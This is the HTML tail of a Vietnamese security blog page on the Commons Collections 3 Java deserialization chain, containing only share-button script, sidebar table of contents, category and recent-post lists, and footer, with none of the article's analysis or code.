+                text: "https://rayinaw.github.io/2023/03/20/CommonsCollections3-md/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rayinaw.github.io/2023/03/20/CommonsCollections3-md/";
+            const title         = "「Phân tích chuỗi Commons Collections 3」";
+            const excerpt       = `Một vài kiến thức cần nắmTrước khi vào bài viết chúng ta cần nắm một số kiến thức sau:
+
+javassist
+ChainedTransformer
+...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Commons-Collections/" rel="tag">Commons Collections</a>, <a class="tag-none-link" href="/tags/Deserialization/" rel="tag">Deserialization</a>, <a class="tag-none-link" href="/tags/Java/" rel="tag">Java</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2023-03-22T12:16:21.617Z" itemprop="dateModified">Lần chỉnh sửa cuối cùng：2023-03-22</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" Phân tích chuỗi Commons Collections 2" href="/2022/12/16/CommonsCollections2/">&lt; Bài đăng cũ hơn</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" loading="lazy" decoding="auto">
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">来年の事を言えば鬼が笑う</p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                Bài đăng
+            </span>
+            <span class="count">
+                9
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                Thể loại
+            </span>
+            <span class="count">
+                8
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                Thẻ
+            </span>
+            <span class="count">
+                9
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        Thư mục bài viết
+        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mot-vai-kien-thuc-can-nam"><span class="toc-text">Một vài kiến thức cần nắm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Moi-truong"><span class="toc-text">Môi trường</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phan-tich"><span class="toc-text">Phân tích</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InstaniateTransformer"><span class="toc-text">InstaniateTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformed"><span class="toc-text">ChainedTransformed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformed-TransformedMap"><span class="toc-text">ChainedTransformed + TransformedMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformed-LazyMap"><span class="toc-text">ChainedTransformed + LazyMap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loi-ket"><span class="toc-text">Lời kết</span></a></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>Thể loại</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/">DevOps</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Docker/">Docker</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/">HTTP Request Smuggling</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Deserialization/">Deserialization</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Programming/">Programming</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/SQLi/">SQLi</a><span class="category-list-count">1</span></li></ul></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>Những thẻ hiện có</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Commons-Collections/" style="font-size: 0.67em;">Commons Collections</a> <a href="/tags/Deserialization/" style="font-size: 0.73em;">Deserialization</a> <a href="/tags/Docker/" style="font-size: 0.6em;">Docker</a> <a href="/tags/HRS/" style="font-size: 0.6em;">HRS</a> <a href="/tags/Java/" style="font-size: 0.8em;">Java</a> <a href="/tags/Mysql/" style="font-size: 0.6em;">Mysql</a> <a href="/tags/Programming/" style="font-size: 0.6em;">Programming</a> <a href="/tags/Reflection/" style="font-size: 0.6em;">Reflection</a> <a href="/tags/SQLi/" style="font-size: 0.6em;">SQLi</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>Bài viết gần đây</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/20/CommonsCollections3-md/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 3</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/12/16/CommonsCollections2/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 2</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/12/15/CommonsCollections1-LazyMap/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 1 với LazyMap</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/12/03/docker-learning/"><i class="fa  fa-book"></i> Một bản ghi chép nhỏ về Docker</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/30/http-request-smuggling-HTTP-1.1/"><i class="fa  fa-book"></i> Khái niệm cơ bản về HTTP request smuggling với HTTP/1.1</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer" class="ap-lrc">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:rayin.awarf@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope"></i></a></li>
+                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://t.me/rayinaw"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/rayinaw"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2023 Rayinaw All rights reserved.</li>
+                            <li>This site has been running for<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank" rel="external nofollow noopener noreferrer">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Rayinaw.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank" rel="external nofollow noopener noreferrer">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js server="netease" type="playlist" id="3204190542" order="random" fixed="true">
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
